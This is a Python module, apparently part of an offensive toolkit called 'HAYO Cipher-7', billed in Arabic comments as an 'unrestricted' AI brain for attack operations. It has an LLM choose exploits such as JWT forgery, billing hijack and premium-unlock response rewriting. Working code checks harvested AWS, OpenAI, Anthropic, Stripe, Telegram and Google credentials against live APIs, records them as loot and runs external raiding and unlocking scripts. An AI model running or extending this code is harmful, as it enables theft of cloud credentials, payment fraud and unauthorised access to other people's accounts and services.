#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Extended AI Brain SHADOW EDITION (extended_brain.py)
=====================================================================
عقل ذكي خارق بلا قيود لإدارة العمليات الهجومية المتقدمة

القدرات الخارقة:
1. نظام قرار هجين (AI سحابي + محلي) مع fallback تلقائي
2. تحليل البيانات المستخرجة (ساكن+ديناميكي) واقتراح استراتيجيات هجومية
3. إدارة المراحل (Pipeline Orchestrator) بشكل ذكي
4. استغلال متكيف (Adaptive Exploitation) يتعلم من النجاحات والفشل
5. نظام تغذية راجعة (Feedback Loop) لتحسين الأداء
6. تكامل مع IntelStore لتسجيل الأدلة
7. قدرة على استدعاء الأدوات الخارجية (Tool Runner)
8. تحليل التعرض السحابي (Cloud Exposure Analysis)
9. إدارة حسابات الاختبار (Test Account Management)
"""
import json
import os
import re
import requests
import subprocess
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple

try:
    from llm_brain import LLMBrain
except ImportError:
    LLMBrain = None

try:
    from intel_store import IntelStore
except ImportError:
    IntelStore = None

G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; R = "\033[91m"; M = "\033[95m"; X = "\033[0m"


class ExtendedBrain:
    """
    SHADOW EDITION — عقل ذكي خارق بلا قيود
    """
    
    def __getattr__(self, name):
        """تمرير أي دالة/سمة غير معرّفة على ExtendedBrain إلى العقل الأساسي الداخلي
        (LLMBrain في self.brain) — مثل summarize/chat/think. يُستدعى فقط عند غياب
        السمة هنا. نستخدم __dict__ مباشرةً لتفادي التكرار اللانهائي قبل اكتمال init."""
        brain = self.__dict__.get("brain")
        if brain is not None and hasattr(brain, name):
            return getattr(brain, name)
        raise AttributeError(f"'ExtendedBrain' object has no attribute '{name}'")

    def __init__(self, base_brain=None, verbose=True, package="session",
                 api_keys: Dict[str, str] = None):
        self.verbose = verbose
        self.package = package
        
        # العقل الأساسي (LLM)
        if LLMBrain:
            self.brain = LLMBrain(verbose=verbose)
        else:
            self.brain = None
            self._log("LLMBrain not available - using local decision engine only", "WARN")
        
        # مفاتيح API للخدمات السحابية
        self.api_keys = api_keys or {}
        
        # حالة الاستراتيجية
        self.strategy = {
            "aggressiveness": 0.8,  # بدء بعدوانية عالية
            "focus_areas": ["crypto", "network", "auth", "cloud", "billing", "premium"],
            "exploit_preferences": {},
            "phase_priorities": {},
            "learning_rate": 0.15,
            "retry_count": 0,
            "max_retries": 10
        }
        
        # تاريخ القرارات
        self.decision_history = []
        self.exploit_history = []
        self.phase_history = []
        
        # تخزين البيانات
        self.static_data = {}
        self.dynamic_data = {}
        self.correlated_data = {}
        self.exploitation_targets = []
        
        # تكامل مع IntelStore
        self.store = None
        try:
            from intel_store import IntelStore
            loot_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "loot")
            self.store = IntelStore(package=package, loot_dir=loot_dir)
        except:
            pass
        
        self._log("☠️ EXTENDED BRAIN SHADOW EDITION INITIALIZED", "CRITICAL")
    
    def _log(self, msg: str, level: str = "INFO"):
        if self.verbose:
            colors = {"INFO": G, "WARN": Y, "ERROR": R, "SUCCESS": C, "CRITICAL": M}
            color = colors.get(level, X)
            print(f"{color}[EXTENDED_BRAIN] [{level}] {msg}{X}")
    
    def _add_evidence(self, attack_name: str, evidence_type: str, value: str):
        if self.store:
            try:
                self.store.add("brain_decision", value, source=attack_name, note=evidence_type)
            except:
                pass
    
    def _extract_json(self, response) -> Optional[Dict]:
        """استخراج JSON من نص مع دعم الأسوار البرمجية."""
        try:
            if isinstance(response, dict):
                return response
            if not response:
                return None
            text = str(response).strip()
            if "```" in text:
                fence = re.search(r"```(?:json)?\s*(\{.*?\}|\[.*?\])\s*```", text, re.DOTALL)
                if fence:
                    text = fence.group(1)
            try:
                return json.loads(text)
            except:
                pass
            m = re.search(r'\{.*\}|\[.*\]', text, re.DOTALL)
            if m:
                return json.loads(m.group(0))
            return None
        except:
            return None
    
    def _methodology(self) -> str:
        """تحميل توجيه/منهجية العقل (brain_directive.txt) مرة واحدة وتخزينها.
        هذا هو مصدر 'تدريب' DeepSeek على مهارات التحقّق الخادمي وGoogle Play."""
        cached = getattr(ExtendedBrain, "_directive_cache", None)
        if cached is None:
            try:
                p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "brain_directive.txt")
                with open(p, "r", encoding="utf-8") as f:
                    cached = f.read().strip()
            except Exception:
                cached = ""
            ExtendedBrain._directive_cache = cached
        return cached

    def _ai_chat(self, system: str, user: str) -> str:
        """محادثة AI مع fallback — يُحقن توجيه المنهجية في كل نداء لتدريب القرار."""
        directive = self._methodology()
        if directive:
            # التوجيه أولًا كمعرفة، ثم تعليمة النظام المحدّدة (مثل 'أخرج JSON') تبقى الأخيرة والأقوى
            system = f"[HAYO METHODOLOGY]\n{directive}\n\n[TASK]\n{system}"
        if self.brain and hasattr(self.brain, 'chat'):
            try:
                return self.brain.chat(system=system, user=user)
            except:
                pass
        return ""
    
    # ============================================================
    # DATA MANAGEMENT
    # ============================================================
    
    def ingest_static_data(self, data: Dict):
        self.static_data = data
        self._analyze_static_data()
    
    def ingest_dynamic_data(self, data: Dict):
        self.dynamic_data.update(data)
        self._correlate_data()
    
    def _analyze_static_data(self):
        prompt = f"""Analyze this static analysis data and identify exploitation targets:
{json.dumps(self.static_data, indent=2, ensure_ascii=False)[:3000]}
Respond with JSON: {{"vulnerabilities":[],"exploitation_targets":[],"cloud_services":[],"secrets":[],"premium_mechanisms":[]}}"""
        response = self._ai_chat("You are a security analyst. Output only valid JSON.", prompt)
        analysis = self._extract_json(response)
        if analysis:
            self.correlated_data["static_analysis"] = analysis
            self.exploitation_targets.extend(analysis.get("exploitation_targets", []))
            self._add_evidence("static_analysis", "vulnerabilities", str(len(analysis.get("vulnerabilities", []))))
    
    def _correlate_data(self):
        prompt = f"""Correlate static and dynamic data to find confirmed vulnerabilities:
Static: {json.dumps(self.static_data, ensure_ascii=False)[:2000]}
Dynamic: {json.dumps(self.dynamic_data, ensure_ascii=False)[:2000]}
Respond with JSON: {{"confirmed":[],"exploitable_credentials":[],"attack_vectors":[],"immediate_actions":[]}}"""
        response = self._ai_chat("You are a security analyst. Output only valid JSON.", prompt)
        correlation = self._extract_json(response)
        if correlation:
            self.correlated_data["correlation"] = correlation
            self.exploitation_targets.extend(correlation.get("exploitable_credentials", []))
            self._add_evidence("correlation", "confirmed", str(len(correlation.get("confirmed", []))))
    
    # ============================================================
    # DECISION MAKING
    # ============================================================
    
    def decide(self, event, analysis=None, context=None):
        """اتخاذ قرار حقيقي بناءً على الحدث."""
        event_type = getattr(event, 'type', 'unknown') if hasattr(event, 'type') else str(event)
        event_data = getattr(event, 'data', {}) if hasattr(event, 'data') else {}
        
        prompt = f"""Event: {event_type}
Data: {json.dumps(event_data, ensure_ascii=False)[:2000]}
Strategy: aggressiveness={self.strategy['aggressiveness']}

Available actions: EXPLOIT, ESCALATE, FOCUS_CLOUD, FOCUS_API, FOCUS_PREMIUM, FOCUS_BILLING, PREFLIGHT_HEALTH, CONTINUE, RETREAT
Respond with JSON: {{"action":"...","reasoning":"...","confidence":0.8}}"""
        
        response = self._ai_chat("You are a pentest orchestrator. Output only valid JSON.", prompt)
        result = self._extract_json(response) or {"action": "EXPLOIT", "reasoning": "default", "confidence": 0.6}
        
        self.decision_history.append({"timestamp": datetime.now().isoformat(), "event": event_type, "decision": result})
        self._add_evidence("decision", result.get("action", "unknown"), event_type)
        return result
    
    def select_exploit(self, target, analysis=None, context=None):
        """اختيار أفضل استغلال."""
        target_type = target.get("type", "unknown") if isinstance(target, dict) else str(target)
        target_secrets = target.get("secrets", {}) if isinstance(target, dict) else {}
        
        prompt = f"""Target: {target_type}
Secrets: {json.dumps(target_secrets, ensure_ascii=False)[:2000]}
Available exploits: jwt_forgery, api_bruteforce, firebase_exploit, supabase_exploit, graphql_attack, idor_attack, stripe_exploit, cloud_raid, premium_patch, google_play_billing_hijack, universal_response_rewrite, server_entitlement_analysis, flutter_reflutter, target_health_preflight
Selection rules: run target_health_preflight FIRST (skip broken/incomplete installs). For mobile premium prefer universal_response_rewrite (flip client-trusted entitlement flag in decrypted SSL_read/OkHttp response) then google_play_billing_hijack (fake owned subscription); use flutter_reflutter for Flutter targets. If the entitlement is signed or the premium CONTENT itself is server-gated, do NOT claim success — report server_entitlement_analysis with the exact check that blocks it.
Respond with JSON: {{"exploit_type":"...","confidence":0.8,"reasoning":"..."}}"""
        
        response = self._ai_chat("You are a security exploit specialist. Output only valid JSON.", prompt)
        result = self._extract_json(response) or {"exploit_type": "cloud_raid", "confidence": 0.5}
        
        self.exploit_history.append({"timestamp": datetime.now().isoformat(), "target": target_type, "exploit": result})
        return result
    
    def update_strategy(self, feedback: Dict):
        """تحديث الاستراتيجية بناءً على التغذية الراجعة."""
        success = feedback.get("success", feedback.get("result", {}).get("success", False))
        if success:
            self.strategy["aggressiveness"] = min(1.0, self.strategy["aggressiveness"] + 0.1)
            self._log("✅ Strategy updated: increased aggressiveness", "SUCCESS")
        else:
            self.strategy["retry_count"] += 1
            if self.strategy["retry_count"] > 3:
                self.strategy["focus_areas"] = self.strategy["focus_areas"][1:] + [self.strategy["focus_areas"][0]]
                self._log("🔄 Rotating focus areas", "WARN")
    
    # ============================================================
    # PHASE MANAGEMENT
    # ============================================================
    
    def should_run_phase(self, phase_name: str, context=None) -> str:
        """تحديد ما إذا كان يجب تشغيل مرحلة."""
        # دائماً شغّل المراحل المطلوبة
        return "RUN"
    
    def adapt_strategy(self, phase_name: str, result: Dict, context=None):
        """تكييف الاستراتيجية بعد المرحلة."""
        if result.get("success"):
            self._log(f"Phase {phase_name} succeeded", "SUCCESS")
            self._add_evidence("phase_success", phase_name, "true")
        else:
            self._log(f"Phase {phase_name} failed", "WARN")
    
    # ============================================================
    # CLOUD SERVICE PROBING (REAL IMPLEMENTATIONS)
    # ============================================================
    
    def probe_cloud_service(self, service_type: str, credentials: Dict) -> Dict:
        """فحص صلاحية خدمات سحابية متنوعة."""
        probers = {
            "aws": self._probe_aws,
            "google": self._probe_google,
            "firebase": self._probe_firebase,
            "openai": self._probe_openai,
            "deepseek": self._probe_deepseek,
            "anthropic": self._probe_anthropic,
            "stripe": self._probe_stripe,
            "supabase": self._probe_supabase,
            "telegram": self._probe_telegram,
        }
        prober = probers.get(service_type)
        if prober:
            return prober(credentials)
        return {"service": service_type, "valid": False, "error": "Unknown service"}
    
    def _probe_aws(self, creds: Dict) -> Dict:
        """فحص صلاحية AWS credentials باستخدام STS GetCallerIdentity."""
        import hashlib
        import hmac
        
        access_key = creds.get("access_key", "")
        secret_key = creds.get("secret_key", "")
        
        if not access_key or not secret_key:
            return {"service": "aws", "valid": False, "error": "Missing credentials"}
        
        try:
            # توقيع SigV4 لـ GetCallerIdentity
            host = "sts.amazonaws.com"
            body = "Action=GetCallerIdentity&Version=2011-06-15"
            amz_date = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
            date_stamp = datetime.utcnow().strftime("%Y%m%d")
            
            def _sign(key, msg):
                return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()
            
            payload_hash = hashlib.sha256(body.encode()).hexdigest()
            canonical_headers = f"host:{host}\nx-amz-date:{amz_date}\n"
            signed_headers = "host;x-amz-date"
            canonical_request = f"POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
            scope = f"{date_stamp}/us-east-1/sts/aws4_request"
            to_sign = f"AWS4-HMAC-SHA256\n{amz_date}\n{scope}\n{hashlib.sha256(canonical_request.encode()).hexdigest()}"
            
            k_date = _sign(("AWS4" + secret_key).encode("utf-8"), date_stamp)
            k_region = _sign(k_date, "us-east-1")
            k_service = _sign(k_region, "sts")
            k_signing = _sign(k_service, "aws4_request")
            signature = hmac.new(k_signing, to_sign.encode("utf-8"), hashlib.sha256).hexdigest()
            
            auth = f"AWS4-HMAC-SHA256 Credential={access_key}/{scope}, SignedHeaders={signed_headers}, Signature={signature}"
            
            resp = requests.post(f"https://{host}/", data=body, headers={
                "Authorization": auth, "x-amz-date": amz_date,
                "Content-Type": "application/x-www-form-urlencoded"
            }, timeout=10)
            
            if resp.status_code == 200 and "Arn" in resp.text:
                arn = re.search(r"<Arn>([^<]+)</Arn>", resp.text)
                acct = re.search(r"<Account>([^<]+)</Account>", resp.text)
                self._add_evidence("aws_probe", "valid", acct.group(1) if acct else "unknown")
                return {"service": "aws", "valid": True, "account": acct.group(1) if acct else "unknown"}
            return {"service": "aws", "valid": False, "error": f"HTTP {resp.status_code}"}
        except Exception as e:
            return {"service": "aws", "valid": False, "error": str(e)}
    
    def _probe_google(self, creds: Dict) -> Dict:
        api_key = creds.get("api_key", "")
        if not api_key:
            return {"service": "google", "valid": False}
        try:
            resp = requests.get(f"https://maps.googleapis.com/maps/api/geocode/json?address=NY&key={api_key}", timeout=10)
            if resp.status_code == 200 and "REQUEST_DENIED" not in resp.text:
                self._add_evidence("google_probe", "valid", api_key[:10])
                return {"service": "google", "valid": True}
            return {"service": "google", "valid": False}
        except:
            return {"service": "google", "valid": False}
    
    def _probe_firebase(self, creds: Dict) -> Dict:
        url = creds.get("storage_url") or creds.get("db_url", "")
        return {"service": "firebase", "valid": bool(url), "info": {"url": url}}
    
    def _probe_openai(self, creds: Dict) -> Dict:
        api_key = creds.get("api_key", "")
        if not api_key:
            return {"service": "openai", "valid": False}
        try:
            resp = requests.get("https://api.openai.com/v1/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
            valid = resp.status_code == 200
            if valid:
                self._add_evidence("openai_probe", "valid", api_key[:10])
            return {"service": "openai", "valid": valid, "models": len(resp.json().get("data", [])) if valid else 0}
        except:
            return {"service": "openai", "valid": False}
    
    def _probe_deepseek(self, creds: Dict) -> Dict:
        api_key = creds.get("api_key", "")
        return {"service": "deepseek", "valid": bool(api_key and api_key.startswith("sk-"))}
    
    def _probe_anthropic(self, creds: Dict) -> Dict:
        api_key = creds.get("api_key", "")
        if not api_key:
            return {"service": "anthropic", "valid": False}
        try:
            resp = requests.get("https://api.anthropic.com/v1/models", headers={
                "x-api-key": api_key, "anthropic-version": "2023-06-01"
            }, timeout=10)
            valid = resp.status_code != 401
            if valid:
                self._add_evidence("anthropic_probe", "valid", api_key[:10])
            return {"service": "anthropic", "valid": valid}
        except:
            return {"service": "anthropic", "valid": False}
    
    def _probe_stripe(self, creds: Dict) -> Dict:
        api_key = creds.get("api_key", "")
        if not api_key:
            return {"service": "stripe", "valid": False}
        try:
            resp = requests.get("https://api.stripe.com/v1/customers?limit=1", auth=(api_key, ""), timeout=10)
            valid = resp.status_code == 200
            if valid:
                self._add_evidence("stripe_probe", "valid", api_key[:10])
            return {"service": "stripe", "valid": valid}
        except:
            return {"service": "stripe", "valid": False}
    
    def _probe_supabase(self, creds: Dict) -> Dict:
        url = creds.get("url", "")
        key = creds.get("anon_key", "")
        if not url or not key:
            return {"service": "supabase", "valid": False}
        try:
            resp = requests.get(f"{url}/rest/v1/", headers={"apikey": key}, timeout=10)
            valid = resp.status_code == 200
            return {"service": "supabase", "valid": valid}
        except:
            return {"service": "supabase", "valid": False}
    
    def _probe_telegram(self, creds: Dict) -> Dict:
        token = creds.get("bot_token", "")
        if not token:
            return {"service": "telegram", "valid": False}
        try:
            resp = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
            valid = resp.json().get("ok", False)
            if valid:
                self._add_evidence("telegram_probe", "valid", token[:10])
            return {"service": "telegram", "valid": valid}
        except:
            return {"service": "telegram", "valid": False}
    
    # ============================================================
    # FINDINGS TRIAGE
    # ============================================================
    
    def triage(self, findings: List[Dict]) -> List[Dict]:
        """تصنيف النتائج باستخدام AI."""
        if not findings:
            return []
        
        try:
            summary = [{"type": f.get("type",""), "severity": f.get("severity",""), "detail": str(f.get("detail",""))[:200]} for f in findings[:50]]
            prompt = f"""Triage these findings and assign priority:
{json.dumps(summary, indent=2, ensure_ascii=False)}
Respond with JSON array: [{{"index":0,"severity":"critical","priority":"immediate","exploitability":"exploitable","recommended_action":"..."}}]"""
            
            response = self._ai_chat("You are a security analyst. Output only valid JSON array.", prompt)
            triage_results = self._extract_json(response)
            
            if triage_results and isinstance(triage_results, list):
                for t in triage_results:
                    idx = t.get("index", -1)
                    if 0 <= idx < len(findings):
                        findings[idx]["triage_severity"] = t.get("severity", findings[idx].get("severity"))
                        findings[idx]["priority"] = t.get("priority", "medium")
                        findings[idx]["exploitability"] = t.get("exploitability", "unknown")
                self._add_evidence("triage", "classified", str(len(triage_results)))
        except:
            pass
        
        return findings
    
    # ============================================================
    # TOOL RUNNER (EXECUTE EXTERNAL TOOLS)
    # ============================================================
    
    def run_tool(self, tool_name: str, **kwargs) -> Dict:
        """استدعاء أداة خارجية."""
        tools = {
            "cloud_raider": "cloud_raider.py",
            "premium_unlocker": "premium_unlocker_android.py",
            "firebase_exploiter": "firebase_exploiter.py",
            "intelligent_exploiter": "intelligent_cloud_exploiter.py",
        }
        
        script = tools.get(tool_name)
        if not script:
            return {"success": False, "error": f"Unknown tool: {tool_name}"}
        
        try:
            tool_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
            script_path = os.path.join(tool_dir, script)
            
            if not os.path.exists(script_path):
                script_path = os.path.join(tool_dir, "artifacts", "hayo ai-agent", script)
            
            if os.path.exists(script_path):
                cmd = [sys.executable, script_path]
                for k, v in kwargs.items():
                    cmd.append(f"--{k}")
                    cmd.append(str(v))
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                self._add_evidence("tool_run", tool_name, str(result.returncode))
                return {"success": result.returncode == 0, "output": result.stdout[:1000]}
            else:
                return {"success": False, "error": f"Script not found: {script_path}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # ============================================================
    # CLOUD EXPOSURE ANALYSIS
    # ============================================================
    
    def analyze_cloud_exposure(self, secrets: List[Dict]) -> Dict:
        """تحليل التعرض السحابي."""
        analysis = {"total_secrets": len(secrets), "cloud_services": {}, "risk_level": "low"}
        
        service_map = {
            "google_api_key": "google", "aws_access": "aws", "openai_key": "openai",
            "anthropic_key": "anthropic", "stripe": "stripe", "telegram_bot": "telegram",
            "firebase": "firebase", "supabase": "supabase"
        }
        
        for secret in secrets:
            stype = secret.get("type", "unknown")
            service = service_map.get(stype, "unknown")
            if service not in analysis["cloud_services"]:
                analysis["cloud_services"][service] = {"count": 0, "valid": 0}
            analysis["cloud_services"][service]["count"] += 1
        
        total = sum(s["count"] for s in analysis["cloud_services"].values())
        if total > 5:
            analysis["risk_level"] = "critical"
        elif total > 2:
            analysis["risk_level"] = "high"
        elif total > 0:
            analysis["risk_level"] = "medium"
        
        self._add_evidence("cloud_exposure", "risk_level", analysis["risk_level"])
        return analysis
    
    # ============================================================
    # STRATEGY & STATS
    # ============================================================
    
    def get_strategy(self) -> Dict:
        return self.strategy.copy()
    
    def get_stats(self) -> Dict:
        return {
            "decision_count": len(self.decision_history),
            "exploit_count": len(self.exploit_history),
            "phase_count": len(self.phase_history),
            "strategy": self.strategy.copy()
        }


def create_extended_brain(verbose=True, package="session") -> ExtendedBrain:
    return ExtendedBrain(verbose=verbose, package=package)


if __name__ == "__main__":
    import sys
    brain = create_extended_brain(verbose=True)
    print(f"Strategy: {brain.get_strategy()}")
    # Test probe
    result = brain.probe_cloud_service("openai", {"api_key": "sk-test"})
    print(f"Probe: {result}")